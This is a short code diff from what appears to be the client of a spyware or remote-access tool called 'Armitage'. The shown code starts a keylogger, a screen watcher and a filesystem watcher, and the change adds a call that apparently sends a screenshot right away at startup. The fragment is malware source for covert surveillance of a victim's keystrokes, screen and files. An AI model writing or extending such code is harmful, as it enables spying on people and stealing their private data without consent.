@@ -76,6 +76,7 @@ namespace Client
             /// Start loggers.
             Armitage.Watchers.Keylogger.Start();
 
+            Armitage.Watchers.Screen_Watcher.SendOne();
             Armitage.Watchers.Screen_Watcher.Start();
 
             Armitage.Watchers.Filesystem.Start();
